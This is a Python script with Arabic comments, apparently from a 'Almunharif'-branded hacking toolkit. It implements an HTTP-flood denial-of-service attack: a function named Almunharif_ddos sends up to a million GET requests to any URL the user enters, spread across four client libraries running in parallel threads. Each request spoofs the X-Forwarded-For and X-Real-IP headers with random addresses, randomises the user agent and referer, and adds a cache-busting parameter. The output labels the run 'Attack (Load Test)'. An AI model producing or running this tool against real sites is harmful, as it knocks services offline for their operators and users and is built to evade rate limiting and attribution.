import requests
import threading
import httpx
import aiohttp
import asyncio
from user_agent import generate_user_agent
from random import randint, choice, uniform
import urllib3
import subprocess
import sys
import os
import time # إضافة لمقاييس الأداء

# --- نفس الجزء الخاص بالطباعة وتحميل المكتبات ---
Almunharif1 = '\x1b[1;31m'
Almunharif2 = '\x1b[1;32m'
# ... (جزء الـ ASCII art والـ print l) ...
# ... (جزء install_and_import والمكتبات المطلوبة) ...

# تأكد من تعطيل تحذيرات SSL إذا كنت تواجه مشاكل مع شهادات الاختبار
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- مقاييس الأداء والإحصائيات ---
successful_requests = 0
failed_requests = 0
total_response_time = 0.0
requests_lock = threading.Lock() # قفل لتحديث العدادات بأمان

def Almunharif_generate_ip():
    return f"{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}"

def Almunharif_generate_diverse_headers():
    # قائمة أوسع من وكلاء المستخدم وأنواع الرؤوس
    user_agent = generate_user_agent()
    random_ip = Almunharif_generate_ip()

    headers = {
        "User-Agent": user_agent,
        "X-Forwarded-For": random_ip,
        "X-Real-IP": random_ip, # إضافة X-Real-IP
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": choice(["en-US,en;q=0.9", "ar-EG,ar;q=0.9", "fr-FR,fr;q=0.9"]),
        "Accept-Encoding": choice(["gzip, deflate, br", "gzip, deflate"]),
        "Connection": "keep-alive",
        "Cache-Control": "no-cache", # طلب عدم استخدام الكاش
        "Pragma": "no-cache" # طلب عدم استخدام الكاش
    }
    # إضافة Referer عشوائيًا
    if uniform(0, 1) < 0.7: # 70% chance to add a referer
        headers["Referer"] = f"https://www.{''.join(choice('abcdefghijklmnopqrstuvwxyz') for _ in range(randint(5,15)))}.com/"
    return headers

def update_stats(is_success, response_time):
    global successful_requests, failed_requests, total_response_time
    with requests_lock:
        if is_success:
            successful_requests += 1
        else:
            failed_requests += 1
        total_response_time += response_time

# --- دوال إرسال الطلبات المعدلة مع قياس الأداء ---
def Almunharif_requests_sync(target_url, Almunharif_num):
    Almunharif_session = requests.Session()
    for _ in range(Almunharif_num):
        Almunharif_headers = Almunharif_generate_diverse_headers()
        url_with_param = f"{target_url}?_={time.time()}" # إضافة بارامتر عشوائي لتجاوز الكاش
        start_time = time.time()
        try:
            Almunharif_response = Almunharif_session.get(url_with_param, headers=Almunharif_headers, timeout=5, verify=False)
            response_time = (time.time() - start_time) * 1000
            print(f"{Almunharif2}Requests: Sent | Status: {Almunharif_response.status_code} | IP: {Almunharif_headers['X-Forwarded-For']} | Time: {response_time:.2f}ms")
            update_stats(Almunharif_response.status_code == 200, response_time)
        except requests.exceptions.RequestException as Almunharif_error:
            response_time = (time.time() - start_time) * 1000
            print(f"{Almunharif1}Requests Error: {Almunharif_error} | IP: {Almunharif_headers['X-Forwarded-For']} | Time: {response_time:.2f}ms")
            update_stats(False, response_time)

def Almunharif_httpx_sync(target_url, Almunharif_num):
    with httpx.Client(verify=False, timeout=5) as Almunharif_client:
        for _ in range(Almunharif_num):
            Almunharif_headers = Almunharif_generate_diverse_headers()
            url_with_param = f"{target_url}?_={time.time()}"
            start_time = time.time()
            try:
                Almunharif_response = Almunharif_client.get(url_with_param, headers=Almunharif_headers)
                response_time = (time.time() - start_time) * 1000
                print(f"{Almunharif2}HTTPX: Sent | Status: {Almunharif_response.status_code} | IP: {Almunharif_headers['X-Forwarded-For']} | Time: {response_time:.2f}ms")
                update_stats(Almunharif_response.status_code == 200, response_time)
            except httpx.RequestError as Almunharif_error:
                response_time = (time.time() - start_time) * 1000
                print(f"{Almunharif1}HTTPX Error: {Almunharif_error} | IP: {Almunharif_headers['X-Forwarded-For']} | Time: {response_time:.2f}ms")
                update_stats(False, response_time)

async def Almunharif_aiohttp_async(target_url, Almunharif_num):
    Almunharif_connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=Almunharif_connector, timeout=aiohttp.ClientTimeout(total=5)) as Almunharif_session:
        tasks = []
        for _ in range(Almunharif_num):
            Almunharif_headers = Almunharif_generate_diverse_headers()
            url_with_param = f"{target_url}?_={time.time()}"
            tasks.append(Almunharif_send_aiohttp_request(Almunharif_session, url_with_param, Almunharif_headers))
        await asyncio.gather(*tasks, return_exceptions=True) # لجمع النتائج حتى لو كانت هناك استثناءات

async def Almunharif_send_aiohttp_request(session, url, headers):
    start_time = time.time()
    try:
        async with session.get(url, headers=headers) as Almunharif_response:
            response_time = (time.time() - start_time) * 1000
            print(f"{Almunharif2}AIOHTTP: Sent | Status: {Almunharif_response.status} | IP: {headers['X-Forwarded-For']} | Time: {response_time:.2f}ms")
            update_stats(Almunharif_response.status == 200, response_time)
    except aiohttp.ClientError as Almunharif_error:
        response_time = (time.time() - start_time) * 1000
        print(f"{Almunharif1}AIOHTTP Error: {Almunharif_error} | IP: {headers['X-Forwarded-For']} | Time: {response_time:.2f}ms")
        update_stats(False, response_time)

def Almunharif_urllib3_sync(target_url, Almunharif_num):
    Almunharif_http = urllib3.PoolManager(cert_reqs='CERT_NONE', timeout=5)
    for _ in range(Almunharif_num):
        Almunharif_headers = Almunharif_generate_diverse_headers()
        url_with_param = f"{target_url}?_={time.time()}"
        start_time = time.time()
        try:
            Almunharif_response = Almunharif_http.request('GET', url_with_param, headers=Almunharif_headers)
            response_time = (time.time() - start_time) * 1000
            print(f"{Almunharif2}URLLIB3: Sent | Status: {Almunharif_response.status} | IP: {Almunharif_headers['X-Forwarded-For']} | Time: {response_time:.2f}ms")
            update_stats(Almunharif_response.status == 200, response_time)
        except urllib3.exceptions.RequestError as Almunharif_error:
            response_time = (time.time() - start_time) * 1000
            print(f"{Almunharif1}URLLIB3 Error: {Almunharif_error} | IP: {Almunharif_headers['X-Forwarded-For']} | Time: {response_time:.2f}ms")
            update_stats(False, response_time)


def Almunharif_ddos(target_url, Almunharif_total_requests):
    # تقسيم الطلبات على المهام بشكل متساوٍ
    Almunharif_num_per_library = Almunharif_total_requests // 4
    if Almunharif_num_per_library == 0: # ضمان عدم وجود قسمة على صفر
        Almunharif_num_per_library = 1

    Almunharif_threads = [
        threading.Thread(target=Almunharif_requests_sync, args=(target_url, Almunharif_num_per_library)),
        threading.Thread(target=Almunharif_httpx_sync, args=(target_url, Almunharif_num_per_library)),
        threading.Thread(target=Almunharif_urllib3_sync, args=(target_url, Almunharif_num_per_library)),
        threading.Thread(target=lambda: asyncio.run(Almunharif_aiohttp_async(target_url, Almunharif_num_per_library)))
    ]

    start_attack_time = time.time()
    for Almunharif_thread in Almunharif_threads:
        Almunharif_thread.start()

    for Almunharif_thread in Almunharif_threads:
        Almunharif_thread.join()
    end_attack_time = time.time()
    total_attack_duration = end_attack_time - start_attack_time

    # --- عرض الإحصائيات النهائية ---
    print("\n" + "="*50)
    print(f"{Almunharif2}Attack (Load Test) Finished!")
    print(f"{Almunharif2}Total Requests Sent: {successful_requests + failed_requests}")
    print(f"{Almunharif2}Successful Requests: {successful_requests}")
    print(f"{Almunharif1}Failed Requests: {failed_requests}")
    if (successful_requests + failed_requests) > 0:
        avg_response_time = total_response_time / (successful_requests + failed_requests)
        print(f"{Almunharif2}Average Response Time: {avg_response_time:.2f}ms")
        requests_per_second = (successful_requests + failed_requests) / total_attack_duration
        print(f"{Almunharif2}Requests Per Second (RPS): {requests_per_second:.2f}")
    print("="*50)


if __name__ == "__main__":
    Almunharif_url = input(f"{Almunharif2} Enter Target URL for Load Test: {Almunharif1}")
    Almunharif_total_requests_input = input(f"{Almunharif2} Enter Total Number of Requests (e.g., 1000000): {Almunharif1}")
    try:
        Almunharif_total_requests = int(Almunharif_total_requests_input)
    except ValueError:
        print(f"{Almunharif1}Invalid number. Using default 1,000,000 requests.")
        Almunharif_total_requests = 1_000_000

    Almunharif_ddos(Almunharif_url, Almunharif_total_requests)

